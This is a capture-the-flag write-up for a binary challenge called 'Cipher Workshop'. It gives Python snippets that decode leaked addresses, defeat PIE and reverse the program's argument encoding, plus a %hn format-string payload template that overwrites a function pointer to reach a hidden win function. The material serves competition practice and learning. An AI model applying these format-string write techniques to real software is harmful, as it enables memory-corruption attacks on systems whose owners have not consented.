# Cipher Workshop - Quick Writeup

## Exploit Flow
![Exploit Workflow](https://github.com/sailay1996/random-stuff/blob/main/ctf_things/cipher_workshop/exploit_workflow.png)

## Binary Info
- 64-bit ELF, PIE, Full RELRO, NX, Canary, Stripped
- Menu: workshop (1), status (3), legacy (4)

## Vulnerabilities Found
1. **Format String** in workshop menu (option 1)
2. **Info Leak** in status menu (option 3) - leaks encoded addresses
3. Hidden **win function** that prints flag

## Exploitation Steps

### Step 1: Leak Addresses
From status menu output:
```python
session_salt = salt_checksum ^ 0xA5A5F0F0C3C3B4B4
vault_addr = session_digest ^ session_salt
pie_base = vault_addr - 0x5040
```

### Step 2: Calculate Targets
```python
reveal_flag = pie_base + 0x1bc0      # win function
hook = vault_addr + 0x48              # write target 1
barrier = vault_addr + 0x40           # write target 2

# barrier must pass integrity check
mix = reveal_flag ^ 0x9e3779b97f4a7c15 ^ session_salt
barrier_target = rot64(mix, 17) ^ 0x2152411021524110
```

### Step 3: Format String Writes
Binary encodes args before printf - reverse it:
```python
def encode_arg(addr, salt, marker, idx):
    rot = ((salt >> (idx * 13)) & 0x3f)
    return inv_rot64((addr + marker) & 0xFFFFFFFFFFFFFFFF, rot) ^ salt
```

Write 64-bit values using 4x `%hn` (16-bit each):
```
[encoded_addr0][encoded_addr1][encoded_addr2][encoded_addr3]%Xc%11$hn%Yc%12$hn%Zc%13$hn%Wc%14$hn
```

### Step 4: Trigger Win
- Write `reveal_flag` to `hook`
- Write `barrier_target` to `barrier`
- Win condition auto-triggers → FLAG

## Key Techniques
| Technique | Purpose |
|-----------|---------|
| XOR recovery | Decode leaked addresses |
| PIE bypass via heap | `vault - offset = base` |
| `%hn` writes | 16-bit arbitrary write |
| Encoded format args | Reverse custom encoding |
| Win function hijack | Overwrite function pointer |

## Tools Used
- pwntools
- objdump/strings (find offsets)
- GDB (dynamic analysis)

## Tips
- Always check for hidden menu options (option 2 missing = suspicious)
- XOR leaks often use predictable constants
- Stripped binary? Look for `getenv`, `fopen("flag")` patterns
- Format string + info leak = PIE bypass
